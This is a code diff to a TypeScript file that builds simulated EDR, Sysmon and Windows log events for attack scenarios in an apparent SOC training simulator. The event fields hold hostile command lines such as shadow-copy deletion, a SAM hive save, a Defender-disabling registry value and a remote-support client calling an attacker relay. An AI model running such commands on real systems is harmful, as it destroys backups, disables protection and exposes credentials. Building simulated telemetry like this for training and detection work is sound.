@@ -2,8 +2,8 @@
  * Endpoint stories. Authored as CrowdStrike and Sysmon rows; instantiateStory relabels EDR rows to
  * the session's product, so all but the WMI one run on every built-in company.
  *
- *  1. core-byovd-edr-killer: two kernel drivers registered as services, Defender switched off through
- *     the DisableAntiSpyware policy value, shadow copies deleted (Akira, GuidePoint 2025).
+ *  1. core-byovd-edr-killer: a remote logon, two kernel drivers registered as services, Defender policy
+ *     off, the sensor falling silent, shadow copies deleted (Akira, GuidePoint 2025).
  *  2. core-dll-sideload: a ZIP with a signed updater renamed as a document and a look-alike libcurl.dll.
  *  3. core-rmm-first-stage: a mail link to an executable that installs a remote support client.
  *  4. core-wmi-remote-exec: admin-share logon, WmiPrvSE children in the default wmiexec output pattern,
@@ -12,11 +12,12 @@
 import type { TelemetryEvent } from "@/lib/sim/types";
 import { makeSha256 } from "@/lib/sim/iocs";
 import { csAlert, csDns, csFile, csProcess, csRegistry } from "@/lib/sim/emitters/crowdstrike";
-import { sysmonDriver } from "@/lib/sim/emitters/sysmon";
+import { sysmonDriver, sysmonProcess } from "@/lib/sim/emitters/sysmon";
 import { panConnection, panWeb } from "@/lib/sim/emitters/paloalto";
+import { sentinelAlert } from "@/lib/sim/emitters/sentinel";
 import { winDetailedShareAccess, winLogon, winServiceInstall } from "@/lib/sim/emitters/windowsSecurity";
 import { mailClick, mailDelivered } from "@/lib/sim/scenario-packs/corroboratingTelemetry.events";
-import { ALL_COMPANIES, AD_COMPANIES, clock, incident, lookalike, sysmonImageLoad, type CoreStoryDef } from "./_kit";
+import { MAIL_GATEWAY_COMPANIES, AD_COMPANIES, OFFICE_EGRESS, clock, incident, lookalike, sysmonImageLoad, type CoreStoryDef } from "./_kit";
 
 const cx = "nexacorp";
 const CMD = "C:\\Windows\\System32\\cmd.exe";
@@ -39,12 +40,21 @@ function byovd(): TelemetryEvent[] {
   const regedit = "C:\\Windows\\regedit.exe", regHash = makeSha256("windows_regedit_exe_signed_microsoft");
   return incident("inc:core-byovd:1", [
     lookalike(sysmonDriver({
-      companyId: cx, id: "cbv01", ts: T(0), host: "WS-ENG-2120", user: null, srcIp: "10.10.20.120", image: "C:\\Program Files\\ThrottleStop\\RwDrv.sys", sha256: makeSha256("core-byovd-throttlestop-install"),
-      signed: true, signature: "TechPowerUp LLC", signatureStatus: "Valid", severity: "low",
-      description: "Sysmon 6 on WS-ENG-2120: driver RwDrv.sys loaded from C:\\Program Files\\ThrottleStop, signed, signature status Valid.",
-    }), "Approved software: ThrottleStop is on this hardware engineer's software request, installed under Program Files, and no service was created from a Temp folder."),
+      companyId: cx, id: "cbv01", ts: T(0), host: "WS-ENG-2120", user: null, srcIp: "10.10.20.120", image: "C:\\Program Files\\RW-Everything\\RwDrv.sys", sha256: makeSha256("core-byovd-rweverything-install"),
+      signed: true, signature: "RW-Everything", signatureStatus: "Valid", severity: "low",
+      description: "Sysmon 6 on WS-ENG-2120: driver RwDrv.sys loaded from C:\\Program Files\\RW-Everything, signed, signature status Valid.",
+    }), "Approved software: RW-Everything is on a software request for hardware diagnostics, installed under Program Files, and no service was created from a Temp folder."),
+    winLogon({
+      companyId: cx, id: "cbv01a", ts: T(2700), host, targetUser: user, logonType: 10, srcIp: "10.10.200.41", authPackage: "Negotiate", logSource: "windows_security", severity: "medium", mitre: "T1021.001", tactic: "Lateral Movement",
+      description: "Security log 4624 on WS-ENG-2093: remote desktop logon for m.reyes from 10.10.200.41, an address in the VPN pool, at 23:15 UTC.",
+    }),
     csProcess({
-      ...c, id: "cbv02", ts: T(3000), processName: "svcupd.exe", pid: 5820, processPath: loader, cmdline: `"${loader}"`, parentName: "cmd.exe", parentPid: 5604, sha256: loaderHash, signed: false, severity: "medium",
+      ...c, id: "cbv01b", ts: T(2890), processName: "cmd.exe", pid: 5604, processPath: CMD, cmdline: "cmd.exe", parentName: "explorer.exe", parentPid: 5102, sha256: cmdHash, signed: true, signatureSubject: ms, integrity: "high", severity: "medium",
+      mitre: "T1059.003", tactic: "Execution",
+      description: "cmd.exe started from explorer.exe on WS-ENG-2093 for m.reyes at High integrity, in the remote desktop session.",
+    }),
+    csProcess({
+      ...c, id: "cbv02", ts: T(3000), processName: "svcupd.exe", pid: 5820, processPath: loader, cmdline: `"${loader}"`, parentName: "cmd.exe", parentPid: 5604, sha256: loaderHash, signed: false, integrity: "high", severity: "medium",
       mitre: "T1036.005", tactic: "Stealth",
       description: "Unsigned svcupd.exe ran from m.reyes's Temp folder on WS-ENG-2093, started from cmd.exe.",
     }),
@@ -59,7 +69,7 @@ function byovd(): TelemetryEvent[] {
       description: "System log 7045 on WS-ENG-2093: service mgdsrv installed, kernel mode driver, image rwdrv.sys in a user Temp folder.",
     }),
     sysmonDriver({
-      companyId: cx, id: "cbv05", ts: T(3011), host, user: null, srcIp: ip, image: rw, sha256: rwHash, signed: true, signature: "TechPowerUp LLC", signatureStatus: "Valid", severity: "high", mitre: "T1068", tactic: "Privilege Escalation",
+      companyId: cx, id: "cbv05", ts: T(3011), host, user: null, srcIp: ip, image: rw, sha256: rwHash, signed: true, signature: "RW-Everything", signatureStatus: "Valid", severity: "high", mitre: "T1068", tactic: "Privilege Escalation",
       description: "Sysmon 6 on WS-ENG-2093: driver rwdrv.sys loaded from m.reyes's Temp folder, signed, signature status Valid.",
     }),
     csFile({
@@ -73,7 +83,7 @@ function byovd(): TelemetryEvent[] {
       description: "System log 7045 on WS-ENG-2093: service KMHLPSVC installed, kernel mode driver, image hlpdrv.sys in a user Temp folder.",
     }),
     sysmonDriver({
-      companyId: cx, id: "cbv08", ts: T(3045), host, user: null, srcIp: ip, image: hlp, sha256: hlpHash, signed: false, signatureStatus: "Unavailable", severity: "critical", mitre: "T1685", tactic: "Defense Impairment",
+      companyId: cx, id: "cbv08", ts: T(3045), host, user: null, srcIp: ip, image: hlp, sha256: hlpHash, signed: false, signature: "-", signatureStatus: "Unavailable", severity: "critical", mitre: "T1685", tactic: "Defense Impairment",
       description: "Sysmon 6 on WS-ENG-2093: driver hlpdrv.sys loaded from m.reyes's Temp folder, no valid signature.",
     }),
     { ...csAlert({
@@ -83,18 +93,24 @@ function byovd(): TelemetryEvent[] {
       description: "EDR alert on WS-ENG-2093: vulnerable driver loaded through service mgdsrv, process svcupd.exe (pid 5820).",
     }), edr_scope: "edr" as const },
     csProcess({
-      ...c, id: "cbv10", ts: T(3070), processName: "regedit.exe", pid: 6010, processPath: regedit, cmdline: `regedit.exe /s ${tmp}\\wd.reg`, parentName: "svcupd.exe", parentPid: 5820, sha256: regHash, signed: true, signatureSubject: ms,
+      ...c, id: "cbv10", ts: T(3070), processName: "regedit.exe", pid: 6010, processPath: regedit, cmdline: `regedit.exe /s ${tmp}\\wd.reg`, parentName: "svcupd.exe", parentPid: 5820, sha256: regHash, signed: true, signatureSubject: ms, integrity: "high",
       severity: "high", mitre: "T1685", tactic: "Defense Impairment",
       description: "regedit.exe imported wd.reg silently from m.reyes's Temp folder, started by svcupd.exe.",
     }),
     csRegistry({
       ...c, id: "cbv11", ts: T(3071), keyPath: "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", valueName: "DisableAntiSpyware", valueData: "1", writerProcess: "regedit.exe", severity: "critical", mitre: "T1685", tactic: "Defense Impairment",
-      description: "DisableAntiSpyware set to 1 under the Windows Defender policy key by regedit.exe.",
+      description: "DisableAntiSpyware set to 1 under HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender by regedit.exe.",
     }),
-    csProcess({
-      ...c, id: "cbv12", ts: T(3200), processName: "cmd.exe", pid: 6188, processPath: CMD, cmdline: "cmd.exe /c vssadmin delete shadows /all /quiet", parentName: "svcupd.exe", parentPid: 5820, sha256: cmdHash, signed: true, signatureSubject: ms,
+    { ...sentinelAlert({
+      companyId: cx, id: "cbv11a", ts: T(3130), user: email, host, srcIp: ip, alertName: "Endpoint sensor stopped reporting while the host stays online", severity: "critical", mitre: "T1685", tactic: "Defense Impairment",
+      detail: "The endpoint protection sensor on this host sent no heartbeat for one minute, while its Windows logs kept arriving.",
+      extendedProperties: { Host: host, SensorStatus: "offline", MissedHeartbeats: 4, WindowsEventsLastMinute: 37 },
+      description: "Sentinel analytic: the endpoint sensor on WS-ENG-2093 stopped reporting one minute after the second driver loaded, while Windows logs from the host kept arriving.",
+    }), edr_scope: "hybrid" as const },
+    sysmonProcess({
+      companyId: cx, id: "cbv12", ts: T(3200), host, user: email, srcIp: ip, processName: "cmd.exe", pid: 6188, processPath: CMD, cmdline: "cmd.exe /c vssadmin delete shadows /all /quiet", parentName: "svcupd.exe", parentPath: loader, parentPid: 5820, sha256: cmdHash, signed: true, integrity: "High",
       severity: "critical", mitre: "T1490", tactic: "Impact",
-      description: "cmd.exe ran vssadmin delete shadows /all /quiet on WS-ENG-2093, started by svcupd.exe.",
+      description: "Sysmon 1 on WS-ENG-2093, after the sensor fell silent: cmd.exe ran vssadmin delete shadows /all /quiet, started by svcupd.exe.",
     }),
   ]);
 }
@@ -134,6 +150,11 @@ function dllSideload(): TelemetryEvent[] {
       severity: "medium", mitre: "T1204.002", tactic: "Execution",
       description: "Statement_Q3.exe started from explorer.exe in a.moreau's Downloads. The file is signed and its embedded original name is GUP.exe.",
     }),
+    sysmonProcess({
+      companyId: cx, id: "csl04s", ts: T(660), host, user: email, srcIp: ip, processName: "Statement_Q3.exe", pid: 7116, processPath: exe, cmdline: `"${exe}"`, parentName: "explorer.exe", parentPid: 3312, sha256: exeHash, signed: true, originalFileName: "GUP.exe", integrity: "Medium",
+      severity: "medium", mitre: "T1036.005", tactic: "Stealth",
+      description: "Sysmon 1 on WS-MKT-3301: Statement_Q3.exe from a.moreau's Downloads, OriginalFileName GUP.exe.",
+    }),
     sysmonImageLoad({
       companyId: cx, id: "csl05", ts: T(661), host, user: email, srcIp: ip, image: exe, pid: 7116, parentName: "explorer.exe", loaded: dll, sha256: dllHash, signed: false, signatureStatus: "Unavailable", severity: "high", mitre: "T1574.001", tactic: "Stealth",
       description: "Sysmon 7 on WS-MKT-3301: Statement_Q3.exe loaded libcurl.dll from its own Downloads folder, not signed.",
@@ -156,6 +177,10 @@ function dllSideload(): TelemetryEvent[] {
       ...c, id: "csl09", ts: T(720), path: persist, sha256: exeHash, size: 798_720, signed: true, severity: "medium", actorProcess: "Statement_Q3.exe", actorPid: 7116, actorPath: exe, actorSha256: exeHash, mitre: "T1036.005", tactic: "Stealth",
       description: "Statement_Q3.exe (pid 7116) copied itself to AppData\\Local\\UpdateSvc as GUP.exe.",
     }),
+    csFile({
+      ...c, id: "csl09b", ts: T(721), path: `C:\\Users\\${user}\\AppData\\Local\\UpdateSvc\\libcurl.dll`, sha256: dllHash, size: 812_032, signed: false, severity: "medium", actorProcess: "Statement_Q3.exe", actorPid: 7116, actorPath: exe, actorSha256: exeHash, mitre: "T1574.001", tactic: "Stealth",
+      description: "Statement_Q3.exe (pid 7116) wrote libcurl.dll to AppData\\Local\\UpdateSvc next to GUP.exe, the same hash as the library in Downloads.",
+    }),
     csRegistry({
       ...c, id: "csl10", ts: T(722), keyPath: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", valueName: "UpdateSvc", valueData: persist, writerProcess: "Statement_Q3.exe", severity: "high", mitre: "T1547.001", tactic: "Persistence",
       description: "Run value UpdateSvc written for a.moreau, pointing at GUP.exe in AppData\\Local\\UpdateSvc.",
@@ -176,16 +201,19 @@ function rmmFirstStage(): TelemetryEvent[] {
   const url = `https://${lure}/d/AnnualStatement.exe`;
   const dropIp = "203.0.113.208", relayIp = "203.0.113.209", relay = "instance-82kd-relay.fastsupport-desk.example";
   const dl = `C:\\Users\\${user}\\Downloads\\AnnualStatement.exe`, dlHash = makeSha256("core-rmm-installer");
-  const svc = "C:\\Program Files (x86)\\ScreenConnect Client (9ab20c41de77)\\ScreenConnect.ClientService.exe", svcHash = makeSha256("remote-support-client-signed");
+  const scId = "9ab20c41de771f36";
+  const svc = `C:\\Program Files (x86)\\ScreenConnect Client (${scId})\\ScreenConnect.ClientService.exe`, svcHash = makeSha256("remote-support-client-signed");
+  const scArgs = (h: string, session: string) => `"?e=Access&y=Guest&h=${h}&p=8041&s=${session}"`;
+  const attackArgs = scArgs(relay, "e52b18c0-7f3a-46d9-b1c4-90a7d3f6e218");
   const msi = "C:\\Windows\\System32\\msiexec.exe", msiHash = makeSha256("windows_msiexec_exe_signed_microsoft");
-  const itSvc = "C:\\Program Files (x86)\\ScreenConnect Client (1c07e2a95b3d)\\ScreenConnect.ClientService.exe";
+  const itSvc = "C:\\Program Files (x86)\\ScreenConnect Client (1c07e2a95b3d6a84)\\ScreenConnect.ClientService.exe";
   return incident(INC, [
     lookalike(csProcess({
       companyId: cx, id: "crm01", ts: T(0), host: "WS-ENG-2120", user: "p.albright@nexacorp.com", srcIp: "10.10.20.120", processName: "ScreenConnect.ClientService.exe", pid: 2204, processPath: itSvc,
-      cmdline: `"${itSvc}" "?e=Access&y=Guest&h=support.nexacorp.com&p=8041"`, parentName: "services.exe", parentPid: 740, sha256: makeSha256("corporate-remote-support-client-build"), signed: true, signatureSubject: "ConnectWise, LLC",
+      cmdline: `"${itSvc}" ${scArgs("support.nexacorp.com", "2c9f47d1-05be-4a63-8e17-c4b6a01d7f35")}`, parentName: "services.exe", parentPid: 740, sha256: makeSha256("corporate-remote-support-client-build"), signed: true, signatureSubject: "ConnectWise, LLC",
       runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "low",
       description: "ScreenConnect.ClientService.exe started from services.exe on WS-ENG-2120 as SYSTEM, relay host support.nexacorp.com.",
-    }), "The company's own remote support tool: the relay is the corporate support host and the client is deployed by IT to all engineering laptops."),
+    }), "The company's own remote support tool: the relay is the corporate support host and the client is deployed by IT."),
     mailDelivered({
       id: "crm02", ts: T(1200), incidentId: INC, user: email, sender: "notices@benefit-statement-view.example", headerFrom: "\"Pension Services\" <notices@benefit-statement-view.example>",
       subject: "Your annual pension statement is ready to view", messageId: "<71bd04e2a6f1@benefit-statement-view.example>", senderIp: "198.51.100.207", qid: "5Ee02B7A18",
@@ -193,7 +221,7 @@ function rmmFirstStage(): TelemetryEvent[] {
       description: "A pension statement notice was delivered to k.jansen from notices@benefit-statement-view.example, with a link to an .exe file on the same domain.",
     }),
     { ...mailClick({
-      id: "crm03", ts: T(2640), incidentId: INC, user: email, sender: "notices@benefit-statement-view.example", messageId: "<71bd04e2a6f1@benefit-statement-view.example>", qid: "5Ee02B7A18", url, domain: lure, clickIp: "217.177.80.10", userAgent: UA,
+      id: "crm03", ts: T(2640), incidentId: INC, user: email, sender: "notices@benefit-statement-view.example", messageId: "<71bd04e2a6f1@benefit-statement-view.example>", qid: "5Ee02B7A18", url, domain: lure, clickIp: OFFICE_EGRESS, userAgent: UA,
       description: "k.jansen followed the link in the pension statement notice from the office egress.",
     }), mitre_technique: "T1204.001", mitre_tactic: "Execution" },
     panWeb({
@@ -211,11 +239,11 @@ function rmmFirstStage(): TelemetryEvent[] {
       description: "msiexec.exe installed ScreenConnect.ClientSetup.msi silently, started by AnnualStatement.exe.",
     }),
     winServiceInstall({
-      companyId: cx, id: "crm07", ts: T(2700), host, targetUser: "SYSTEM", userEmail: null, serviceName: "ScreenConnect Client (9ab20c41de77)", imagePath: `"${svc}" "?e=Access&y=Guest&h=${relay}&p=8041"`, logSource: "windows_security", severity: "high", mitre: "T1543.003", tactic: "Persistence",
-      description: "System log 7045 on WS-HR-1182: service ScreenConnect Client (9ab20c41de77) installed, auto start, relay host instance-82kd-relay.fastsupport-desk.example.",
+      companyId: cx, id: "crm07", ts: T(2700), host, targetUser: "SYSTEM", userEmail: null, serviceName: `ScreenConnect Client (${scId})`, imagePath: `"${svc}" ${attackArgs}`, logSource: "windows_security", severity: "high", mitre: "T1543.003", tactic: "Persistence",
+      description: `System log 7045 on WS-HR-1182: service ScreenConnect Client (${scId}) installed, auto start, relay host instance-82kd-relay.fastsupport-desk.example.`,
     }),
     csProcess({
-      ...c, id: "crm08", ts: T(2702), processName: "ScreenConnect.ClientService.exe", pid: 6520, processPath: svc, cmdline: `"${svc}" "?e=Access&y=Guest&h=${relay}&p=8041"`, parentName: "services.exe", parentPid: 740, sha256: svcHash, signed: true, signatureSubject: "ConnectWise, LLC",
+      ...c, id: "crm08", ts: T(2702), processName: "ScreenConnect.ClientService.exe", pid: 6520, processPath: svc, cmdline: `"${svc}" ${attackArgs}`, parentName: "services.exe", parentPid: 740, sha256: svcHash, signed: true, signatureSubject: "ConnectWise, LLC",
       runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "high", mitre: "T1219.002", tactic: "Command and Control",
       description: "ScreenConnect.ClientService.exe started from services.exe on WS-HR-1182 as SYSTEM, relay host instance-82kd-relay.fastsupport-desk.example.",
     }),
@@ -242,7 +270,10 @@ function wmiRemoteExec(): TelemetryEvent[] {
   const c = { companyId: cx, host: target, user: email, srcIp: tgtIp };
   const wmi = "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe";
   const cmdHash = makeSha256("windows_cmd_exe_signed_microsoft");
-  const out = "__1760569812.4471";
+  // wmiexec names its output file after the clock of the machine running it.
+  const out = `__${Math.floor(Date.parse(T(1810)) / 1000)}.4471`;
+  const operator = "j.chen";
+  const py = `C:\\Users\\${operator}\\AppData\\Local\\Temp\\py\\python.exe`;
   const wmic = (id: string, sec: number, pid: number, inner: string, mitre: string, tactic: string, description: string, severity: TelemetryEvent["severity"] = "high"): TelemetryEvent => csProcess({
     ...c, id, ts: T(sec), processName: "cmd.exe", pid, processPath: CMD, cmdline: `cmd.exe /Q /c ${inner} 1> \\\\127.0.0.1\\ADMIN$\\${out} 2>&1`, parentName: "WmiPrvSE.exe", parentPid: 2912, sha256: cmdHash, signed: true, signatureSubject: ms, severity, mitre, tactic, description,
   });
@@ -252,14 +283,19 @@ function wmiRemoteExec(): TelemetryEvent[] {
       cmdline: "powershell.exe -NoLogo -NonInteractive -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1", parentName: "WmiPrvSE.exe", parentPid: 2912, sha256: makeSha256("windows_powershell_v1_signed_microsoft"), signed: true, signatureSubject: ms, severity: "low",
       description: "powershell.exe started by WmiPrvSE.exe on SRV-NXC-FS01, running inventory.ps1 from C:\\Windows\\CCM\\SystemTemp.",
     }), "Configuration Manager's nightly hardware inventory. The script sits in the CCM folder, no output is written to ADMIN$."),
+    csProcess({
+      companyId: cx, id: "cwm01a", ts: T(1795), host: src, user: `${operator}@nexacorp.com`, srcIp, processName: "python.exe", pid: 7704, processPath: py, cmdline: `"${py}" wx.py NEXACORP/${user}@${tgtIp}`,
+      parentName: "cmd.exe", parentPid: 7610, sha256: makeSha256("core-wmi-python-runtime"), signed: false, severity: "medium", mitre: "T1047", tactic: "Execution",
+      description: "python.exe from j.chen's Temp folder ran wx.py on WS-ENG-2093 with the account svc.deploy and the address of SRV-NXC-FS01 as arguments.",
+    }),
     winLogon({
-      companyId: cx, id: "cwm02", ts: T(1800), host: target, targetUser: user, logonType: 3, srcIp, authPackage: "NTLM", workstation: src, lmPackage: "NTLM V2", keyLength: "128", logSource: "windows_security", severity: "medium", mitre: "T1078.002", tactic: "Lateral Movement",
+      companyId: cx, id: "cwm02", ts: T(1800), host: target, targetUser: user, logonType: 3, srcIp, authPackage: "NTLM", workstation: src, lmPackage: "NTLM V2", keyLength: "128", logSource: "windows_security", severity: "medium", mitre: "T1078.002", tactic: "Stealth",
       description: "Security log 4624 on SRV-NXC-FS01: network logon for svc.deploy from WS-ENG-2093 (10.10.20.93) using NTLM.",
     }),
     { ...wmic("cwm03", 1812, 4510, "whoami /all", "T1047", "Execution", "cmd.exe started by WmiPrvSE.exe on SRV-NXC-FS01 with /Q /c, running whoami and redirecting output to a file on ADMIN$."), is_detection: true, edr_scope: "hybrid" as const },
     winDetailedShareAccess({
       companyId: cx, id: "cwm04", ts: T(1815), host: target, targetUser: user, srcIp, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows", relativeTargetName: out, accessMask: "0x1", accessList: "%%4416", logSource: "windows_security", severity: "high", mitre: "T1021.002", tactic: "Lateral Movement",
-      description: "Security log 5145 on SRV-NXC-FS01: svc.deploy read __1760569812.4471 on ADMIN$ from 10.10.20.93.",
+      description: `Security log 5145 on SRV-NXC-FS01: svc.deploy read ${out} on ADMIN$ from 10.10.20.93.`,
     }),
     wmic("cwm05", 1840, 4602, "net group \"Domain Admins\" /domain", "T1069.002", "Discovery", "cmd.exe started by WmiPrvSE.exe on SRV-NXC-FS01 listed the Domain Admins group."),
     wmic("cwm06", 1900, 4688, "reg save HKLM\\SAM C:\\Windows\\Temp\\s.tmp", "T1003.002", "Credential Access", "cmd.exe started by WmiPrvSE.exe on SRV-NXC-FS01 saved the SAM hive to C:\\Windows\\Temp\\s.tmp.", "critical"),
@@ -268,12 +304,16 @@ function wmiRemoteExec(): TelemetryEvent[] {
       companyId: cx, id: "cwm08", ts: T(1960), host: target, targetUser: user, srcIp, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows", relativeTargetName: "Temp\\s.tmp", accessMask: "0x1", accessList: "%%4416", logSource: "windows_security", severity: "high", mitre: "T1039", tactic: "Collection",
       description: "Security log 5145 on SRV-NXC-FS01: svc.deploy read Temp\\s.tmp on ADMIN$ from 10.10.20.93.",
     }),
+    winDetailedShareAccess({
+      companyId: cx, id: "cwm09", ts: T(1966), host: target, targetUser: user, srcIp, shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows", relativeTargetName: "Temp\\y.tmp", accessMask: "0x1", accessList: "%%4416", logSource: "windows_security", severity: "high", mitre: "T1039", tactic: "Collection",
+      description: "Security log 5145 on SRV-NXC-FS01: svc.deploy read Temp\\y.tmp on ADMIN$ from 10.10.20.93.",
+    }),
   ]);
 }
 
 export const ENDPOINT_STORIES: CoreStoryDef[] = [
   { id: "core-byovd-edr-killer", title: "EDR Killer: Vulnerable Driver, Defender Policy Off, Shadow Copies Deleted", complexity: "advanced", events: byovd() },
   { id: "core-dll-sideload", title: "DLL Side-Loading: Signed Updater Renamed as a Statement", complexity: "foundation", events: dllSideload() },
-  { id: "core-rmm-first-stage", title: "Remote Support Client as First Payload: Pension Statement Lure", complexity: "foundation", companies: ALL_COMPANIES, events: rmmFirstStage() },
-  { id: "core-wmi-remote-exec", title: "WMI Remote Execution: wmiexec Pattern on a File Server, Hive Save", complexity: "advanced", companies: [...AD_COMPANIES, "quantumbank"], events: wmiRemoteExec() },
+  { id: "core-rmm-first-stage", title: "Remote Support Client as First Payload: Pension Statement Lure", complexity: "foundation", companies: MAIL_GATEWAY_COMPANIES, events: rmmFirstStage() },
+  { id: "core-wmi-remote-exec", title: "WMI Remote Execution: wmiexec Pattern on a File Server, Hive Save", complexity: "advanced", companies: AD_COMPANIES, events: wmiRemoteExec() },
 ];
